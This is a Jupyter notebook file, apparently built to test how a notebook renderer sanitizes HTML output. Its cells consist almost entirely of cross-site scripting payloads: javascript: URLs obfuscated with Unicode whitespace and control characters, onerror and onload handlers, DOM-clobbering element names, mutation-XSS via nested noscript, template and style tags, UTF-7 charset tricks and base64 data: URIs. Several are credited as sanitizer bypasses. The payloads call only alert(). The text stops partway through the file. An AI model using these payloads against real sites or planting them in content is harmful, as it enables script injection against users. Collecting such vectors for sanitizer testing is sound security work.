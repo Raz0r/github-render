{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<svg><image id=\"v-146\" width=\"500\" height=\"500\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E\" preserveratio=\"true\" style=\"border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;\"></image></svg>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<svg><image id=\"v-146\" width=\"500\" height=\"500\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" href=\"data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E\" preserveratio=\"true\" style=\"border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;\"></image></svg>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div aria-labelledby=\"msg--title\" role=\"dialog\" class=\"msg\"><button class=\"modal-close\" aria-label=\"close\" type=\"button\"><i class=\"icon-close\"></i>some button</button></div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<input type=checkbox checked><input type=checkbox onclick>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<svg><defs><filter id=\"f1\"><feGaussianBlur in=\"SourceGraphic\" stdDeviation=\"15\" /></filter></defs><rect width=\"90\" height=\"90\" stroke=\"green\" stroke-width=\"3\" fill=\"yellow\" filter=\"url(#f1)\" /></svg>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<b href=\"javascript:alert(1)\" title=\"javascript:alert(2)\"></b>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<img src=\"data:,123\"><audio src=\"data:,456\"></audio><video src=\"data:,789\"></video><source src=\"data:,012\"><div src=\"data:,345\">"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<img src=x name=createElement><img src=y id=createElement>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<img src=x name=cookie>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "123<a href='\u2028javascript:alert(1)'>I am a dolphin!</a>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "123<a href='\u2028javascript:alert(1)'>I am a dolphin too!</a>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "123<a href=' javascript:alert(1)'>CLICK</a><a href='&#xA0javascript:alert(1)'>CLICK</a><a href='&#x1680;javascript:alert(1)'>CLICK</a><a href='&#x180E;javascript:alert(1)'>CLICK</a><a href='&#x2000;javascript:alert(1)'>CLICK</a><a href='&#x2001;javascript:alert(1)'>CLICK</a><a href='&#x2002;javascript:alert(1)'>CLICK</a><a href='&#x2003;javascript:alert(1)'>CLICK</a><a href='&#x2004;javascript:alert(1)'>CLICK</a><a href='&#x2005;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2007;javascript:alert(1)'>CLICK</a><a href='&#x2008;javascript:alert(1)'>CLICK</a><a href='&#x2009;javascript:alert(1)'>CLICK</a><a href='&#x200A;javascript:alert(1)'>CLICK</a><a href='&#x200B;javascript:alert(1)'>CLICK</a><a href='&#x205f;javascript:alert(1)'>CLICK</a><a href='&#x3000;javascript:alert(1)'>CLICK</a>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<img src=data:image/jpeg,ab798ewqxbaudbuoibeqbla>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<img src=\"\r\ndata:image/jpeg,ab798ewqxbaudbuoibeqbla\">"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<img src='javascript:while(1){}'>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<a href=data:,evilnastystuff>clickme</a>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "123456"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<form onmouseover='alert(1)'><input name=\"attributes\"><input name=\"attributes\">"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<img src=x name=getElementById>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<a href=\"#some-code-here\" id=\"location\">invisible"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div onclick=alert(0)><form onsubmit=alert(1)><input onfocus=alert(2) name=parentNode>123</form></div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeName>123</form>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeType>123</form>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<form onsubmit=alert(1)><input onfocus=alert(2) name=children>123</form>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<form onsubmit=alert(1)><input onfocus=alert(2) name=attributes>123</form>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<form onsubmit=alert(1)><input onfocus=alert(2) name=removeChild>123</form>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<form onsubmit=alert(1)><input onfocus=alert(2) name=removeAttributeNode>123</form>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<form onsubmit=alert(1)><input onfocus=alert(2) name=setAttribute>123</form>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<style>*{color: red}</style>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<p>hello</p>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<listing>&lt;img onerror=\"alert(1);//\" src=x&gt;<t t></listing>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<img src=x id/=' onerror=alert(1)//'>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<textarea>@shafigullin</textarea><!--</textarea><img src=x onerror=alert(1)>-->"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<b><noscript><!-- </noscript><img src=x onerror=alert(1) --></noscript>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<b><noscript><a alt=\"</noscript><img src=x onerror=alert(1)>\"></noscript>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<body><template><s><template><s><img src=x onerror=alert(1)>@shafigullin</s></template></s></template>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<a href=\"\u0001java\u0003script:alert(1)\">@shafigullin<a>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "\u0001<option><style></option></select><b><img src=x onerror=alert(1)></style></option>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<option><iframe></select><b><script>alert(1)</script>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "</iframe></option>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<b><style><style/><img src=x onerror=alert(1)>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<b><style><style////><img src=x onerror=alert(1)></style>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\">\n  <mrow>\n    <menclose notation=\"box\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathcolor=\"#FF0000\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathbackground=\"#80FF80\"><mi mathcolor=\"#FF0000\">a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\" mathcolor=\"#FF0000\" mathbackground=\"#80FF80\"><mi>a</mi></menclose><mo>,</mo>\n    <menclose notation=\"box\"><mi mathbackground=\"#80FF80\">a</mi></menclose>\n  </mrow>\n</math>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<image name=body><image name=adoptNode>@mmrupp<image name=firstElementChild><svg onload=alert(1)>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<a href=\"\u0001java\u0003script:alert(1)\">@shafigullin<a>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<image name=activeElement><svg onload=alert(1)>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div onmouseout=\"javascript:alert(/superevr/)\" x=yscript: n>@superevr</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<button remove=me onmousedown=\"javascript:alert(1);\" onclick=\"javascript:alert(1)\" >@giutro"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<a href=\"javascript:123\" onclick=\"alert(1)\">CLICK ME (bypass by @shafigullin)</a>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<isindex x=\"javascript:\" onmouseover=\"alert(1)\" label=\"variation of bypass by @giutro\">"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div wow=removeme onmouseover=alert(1)>text"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<isindex src=\"javascript:\" onmouseover=\"alert(1)\" label=\"bypass by @giutro\" />"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<a href=\"javascript:123\" onclick=\"alert(1)\">CLICK ME (bypass by @shafigullin)</a>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<form action=\"javasc\nript:alert(1)\"><button>XXX</button></form>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"1\"><form id=\"foobar\"></form><button form=\"foobar\" formaction=\"javascript:alert(1)\">X</button>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"2\"><meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"3\"><meta charset=\"x-imap4-modified-utf7\">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"4\">0?<script>Worker(\"#\").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"5\"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"6\"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"7\"><input onfocus=alert(7) autofocus>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"8\"><input onblur=alert(8) autofocus><input autofocus>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"9\"><a style=\"-o-link:'javascript:alert(9)';-o-link-source:current\">X</a>//[\"'`-->]]>]</div>\n\n<div id=\"10\"><video poster=javascript:alert(10)//></video>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"11\"><svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"javascript:alert(11)\"></g></svg>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"12\"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"13\"><x repeat=\"template\" repeat-start=\"999999\">0<y repeat=\"template\" repeat-start=\"999999\">1</y></x>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"14\"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"15\"><script>({0:#0=alert/#0#/#0#(0)})</script>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"16\">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"17\"><?xml-stylesheet href=\"javascript:alert(17)\"?><root/>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"18\"><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"19\"><meta charset=\"x-mac-farsi\">\u00bcscript \u00bealert(19)//\u00bc/script \u00be//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"20\"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"21\"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"22\"><input onblur=focus() autofocus><input>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"23\"><form id=foobar onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"24\">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`behAvior:url(#default#time2)` attributename=`innerhtml` to=`<img/src=\"x\"onerror=alert(24)>`>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"25\"><script src=\"#\">{alert(25)}</script>;1//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"26\">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"27\"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//[\"'`-->]]>]</div><div id=\"28\">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=<img/src=\".\"onerror=alert(28)>>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"29\"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"30\"><style>@import \"data:,*%7bx:expression(alert(30))%7D\";</style>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"31\"><frameset onload=alert(31)>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"32\"><table background=\"javascript:alert(32)\"></table>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"33\"><a style=\"pointer-events:none;position:absolute;\"><a style=\"position:absolute;\" onclick=\"alert(33);\">XXX</a></a><a href=\"javascript:alert(2)\">XXX</a>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"34\">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"35\">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"36\"><a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(36)\">XXX</a>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"37\"><!--<img src=\"--><img src=x onerror=alert(37)//\">//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"38\"><comment><img src=\"</comment><img src=x onerror=alert(38)//\">//[\"'`-->]]>]</div><div id=\"39\"><!-- up to Opera 11.52, FF 3.6.28 -->"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<![><img src=\"]><img src=x onerror=alert(39)//\">"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->\n<svg><![CDATA[><image xlink:href=\"]]><img src=x onerror=alert(2)//\"></svg>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"40\"><style><img src=\"</style><img src=x onerror=alert(40)//\">//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"41\"><li style=list-style:url() onerror=alert(41)></li>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"42\"><head><base href=\"javascript://\"/></head><body><a href=\"/. /,alert(42)//#\">XXX</a></body>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"43\"><?xml version=\"1.0\" standalone=\"no\"?>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<html xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n<style type=\"text/css\">\n@font-face {font-family: y; src: url(\"font.svg#x\") format(\"svg\");} body {font: 100px \"y\";}\n</style>\n</head>\n<body>Hello</body>\n</html>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"44\"><style>*[{}@import'test.css?]{color: green;}</style>X//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"45\"><div style=\"font-family:'foo[a];color:red;';\">XXX</div>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"46\"><div style=\"font-family:foo}color=red;\">XXX</div>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"47\"><svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(47)</script></svg>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"48\"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"49\"><OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(49)\"></OBJECT>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"50\"><object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"51\"><embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></embed>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"52\"><x style=\"behavior:url(test.sct)\">//[\"'`-->]]>]</div><div id=\"53\"><xml id=\"xss\" src=\"test.htc\"></xml>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<label dataformatas=\"html\" datasrc=\"#xss\" datafld=\"payload\"></label>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"54\"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"55\"><video><source onerror=\"alert(55)\">//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"56\"><video onerror=\"alert(56)\"><source></source></video>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"57\"><b <script>alert(57)//</script>0</script></b>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"58\"><b><script<b></b><alert(58)</script </b></b>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"59\"><div id=\"div1\"><input value=\"``onmouseover=alert(59)\"></div> <div id=\"div2\"></div><script>document.getElementById(\"div2\").innerHTML = document.getElementById(\"div1\").innerHTML;</script>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"60\"><div style=\"[a]color[b]:[c]red\">XXX</div>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
